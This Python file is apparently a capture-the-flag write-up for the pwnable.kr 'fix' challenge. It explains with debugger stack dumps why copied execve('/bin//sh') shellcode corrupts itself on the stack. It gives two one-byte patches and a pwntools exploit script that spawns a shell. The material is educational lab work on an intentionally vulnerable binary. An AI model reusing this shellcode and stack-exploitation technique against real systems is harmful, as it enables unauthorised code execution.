'''
This is write up for fix

*(int*)(buf+32) = buf;      # buf: ebp-0x1C(28h) -> 32 = 28 + 4(retn addr)

before stccpy()
00:0000| esp  0xffb0c700 -> 0xffb0c71c <- 0x0                                                                         # push the start addr of buf (stored in eax)
01:0004|      0xffb0c704 -> 0x804a02c (sc) <- xor    eax, eax /* 0x6850c031 */                                        # push sc addr
02:0008|      0xffb0c708 -> 0xffb0c758 <- 0x0
03:000c|      0xffb0c70c -> 0x804a060 (stdin@@GLIBC_2.0) -> 0xf7eb35c0 (_IO_2_1_stdin_) <- mov    byte ptr [edx], ah /* 0xfbad2288 */
04:0010|      0xffb0c710 -> 0xf7eb3d80 (_IO_2_1_stdout_) <- test   byte ptr [edx], ch /* 0xfbad2a84 */
05:0014|      0xffb0c714 -> 0x8048764 <- push   esp /* 'Tell me the value to be patched : ' */
06:0018|      0xffb0c718 -> 0xffb0c734 -> 0xffb0c748 <- 0x1
07:001c| eax  0xffb0c71c <- 0x0                                                                                       # the start addr of buf
08:0020|      0xffb0c720 -> 0xf7eb3000 (_GLOBAL_OFFSET_TABLE_) <- insb   byte ptr es:[edi], dx /* 0x1d7d6c */
09:0024|      0xffb0c724 <- 0x0
0a:0028|      0xffb0c728 -> 0xffb0c758 <- 0x0
0b:002c|      0xffb0c72c -> 0x8048607 (main+180) <- add    esp, 0x10
0c:0030|      0xffb0c730 -> 0x804875e <- and    eax, 0x64 /* '%d' */
0d:0034|      0xffb0c734 -> 0xffb0c748 <- 0x1
0e:0038| ebp  0xffb0c738 -> 0xffb0c758 <- 0x0
0f:003c|      0xffb0c73c -> 0x804861b (main+200) <- mov    eax, 0

after stccpy()
00:0000| esp  0xffb0c700 -> 0xffb0c71c <- 0x6850c031
01:0004|      0xffb0c704 -> 0x804a02c (sc) <- xor    eax, eax /* 0x6850c031 */
02:0008|      0xffb0c708 -> 0xffb0c758 <- 0x0
03:000c|      0xffb0c70c -> 0x804a060 (stdin@@GLIBC_2.0) -> 0xf7eb35c0 (_IO_2_1_stdin_) <- mov    byte ptr [edx], ah /* 0xfbad2288 */
04:0010|      0xffb0c710 -> 0xf7eb3d80 (_IO_2_1_stdout_) <- test   byte ptr [edx], ch /* 0xfbad2a84 */
05:0014|      0xffb0c714 -> 0x8048764 <- push   esp /* 'Tell me the value to be patched : ' */
06:0018|      0xffb0c718 -> 0xffb0c734 -> 0xffb0c748 <- 0x1
07:001c| eax  0xffb0c71c <- 0x6850c031
08:0020|      0xffb0c720 <- 0x68732f2f ('//sh')
09:0024|      0xffb0c724 <- 0x1622f68
0a:0028|      0xffb0c728 <- 0x50e3896e
0b:002c|      0xffb0c72c <- 0xb0e18953
0c:0030| edx  0xffb0c730 <- 0x80cd0b
0d:0034|      0xffb0c734 -> 0xffb0c748 <- 0x1
0e:0038| ebp  0xffb0c738 -> 0xffb0c758 <- 0x0
0f:003c|      0xffb0c73c -> 0x804861b (main+200) <- mov    eax, 0

modify the retn addr
00:0000| esp  0xffb0c710 -> 0xf7eb3d80 (_IO_2_1_stdout_) <- test   byte ptr [edx], ch /* 0xfbad2a84 */
01:0004|      0xffb0c714 -> 0x8048764 <- push   esp /* 'Tell me the value to be patched : ' */
02:0008|      0xffb0c718 -> 0xffb0c734 -> 0xffb0c748 <- 0x1
03:000c|      0xffb0c71c <- 0x6850c031
04:0010|      0xffb0c720 <- 0x68732f2f ('//sh')
05:0014|      0xffb0c724 <- 0x1622f68
06:0018|      0xffb0c728 <- 0x50e3896e
07:001c|      0xffb0c72c <- 0xb0e18953
08:0020|      0xffb0c730 <- 0x80cd0b
09:0024|      0xffb0c734 -> 0xffb0c748 <- 0x1
0a:0028| ebp  0xffb0c738 -> 0xffb0c758 <- 0x0
0b:002c|      0xffb0c73c -> 0xffb0c71c <- 0x6850c031                                                                    # retn addr has been modified as buf addr

   0xffb0c71c                   xor    eax, eax
   0xffb0c71e                   push   eax
   0xffb0c71f                   push   0x68732f2f
   0xffb0c724                   push   0x6e69622f
 > 0xffb0c729                   mov    ebx, esp
   0xffb0c72b                   push   eax
    ...
   0xffb0c72b                   push   ebx

-------------------------------------------------------------------------------------------------[ STACK ]--------------------------------------------------------------------------------------------------
00:0000| esp  0xffb0c734 <- '/bin'
01:0004|      0xffb0c738 <- '//sh'
02:0008|      0xffb0c73c <- 0x0
03:000c|      0xffb0c740 <- 0x1
04:0010|      0xffb0c744 -> 0xffb0c804 -> 0xffb0d417 <- '/home/bc7/Desktop/fix'
05:0014|      0xffb0c748 <- 0x1

+--------+
|        |  <- ebp@shellcode - 0x1c # The start of the shellcode
+--------+
   ...
+--------+
|        |  (ebp@shellcode-0x5) --- # The end of the shellcode 
+--------+                       |
|        |                       |
+--------+                   0x4*3+1=13 which could only cover 3 pushes
|ebp@main|  <- ebp@shellcode     |
+--------+                       |
|  retn  |  -----------------------
+--------+
|        |  <- ebp@shellcode+0x8 (esp@main)
+--------+

However when perform the pushing of the shellcode, we will have 5 pushes, so the top of stack will be 0xffb0c740-0x4*5=0xffb0c72c.

+--------+
|        |  <- ebp@shellcode - 0x1c
+--------+
   ...
+--------+
|        |  <- push ebx            # so, there will be about 4+3=7 bytes at the end of shellcode will be overwritten.
+--------+
|        |  (ebp@shellcode-0x5) The end of the shellcode <- eax
+--------+
|        |  <- push 0x6e69622f
+--------+
|        |  <- push 0x68732f2f
+--------+
|        |  <- push eax
+--------+
|        |  <- ebp@shellcode+0x8 (esp@main)
+--------+

\>>> from pwn import *
\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp   // The code below this will be overwritten.
  13:   b0 0b                   mov    al, 0xb    // execve()
  15:   cd 80                   int    0x80


Solution 1:
\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x5c\x53\x89\xe1\xb0\x0b\xcd\x80")
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   5c                      pop    esp                 // modify to 5c -> pop esp, reset esp to anywhere and will not affect the shellcode.
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80

fix@pwnable:~$ ulimit -s unlimited
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!

Soluton 2：
\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xc9\x53\x89\xe1\xb0\x0b\xcd\x80")
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   c9                      leave
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80

eax: 0xb; ebx: *filename; ecx: argv[]; edx: envp[]

 > 0xffcc3511    int    0x80 <SYS_execve>
        path: 0xffcc3514 <- '/bin//sh'
        argv: 0xffcc3538 -> 0xffcc3514 <- '/bin//sh'
        envp: 0xf7f60890 (_IO_stdfile_1_lock) <- 0x0
   0xffcc3513    add    byte ptr [edi], ch
   0xffcc3515    bound  ebp, qword ptr [ecx + 0x6e]
   0xffcc3518    das    
   0xffcc3519    das    
   0xffcc351a    jae    0xffcc3584
--------------------------------------------------------------------------------------------------[ STACK ]--------------------------------------------------------------------------------------------------
00:0000│ ecx esp  0xffcc3538 -> 0xffcc3514 <- '/bin//sh'                                                    # First agrv in ecx
01:0004│          0xffcc353c -> 0xf7d9fe81 (__libc_start_main+241) <- add    esp, 0x10                      # Second argv in ecx (abnormal)
02:0008│          0xffcc3540 -> 0xf7f5f000 (_GLOBAL_OFFSET_TABLE_) <- insb   byte ptr es:[edi], dx /* 0x1d7d6c */
... ...
04:0010│          0xffcc3548 <- 0x0
05:0014│          0xffcc354c -> 0xf7d9fe81 (__libc_start_main+241) <- add    esp, 0x10
06:0018│          0xffcc3550 <- 0x1
07:001c│          0xffcc3554 -> 0xffcc35e4 -> 0xffcc53de <- '/home/bc7/Desktop/fix'

correct:    execve("/bin//sh", ["/bin//sh", 0], 0)
incorrect:  execve("/bin//sh", ["/bin//sh", xxxx], 0)
modify:     execve("/bin//sh", ["/bin//sh", "sh"], 0)       # "sh" stands for "shell prompt"

'''
from pwn import *

p = process("/home/fix/fix")
p.recvuntil("fixed : ")
p.sendline("15")
p.recvuntil("patched : ")
p.sendline("201")
p.recvuntil("Can't open ")
filename = p.recvline().strip("\n")
with open(filename, "w") as f:
    f.write("sh\n")
p.kill()
# Second execution
p = process("/home/fix/fix")
p.sendline("15")
p.recvuntil("patched : ")
p.sendline("201")
p.interactive()
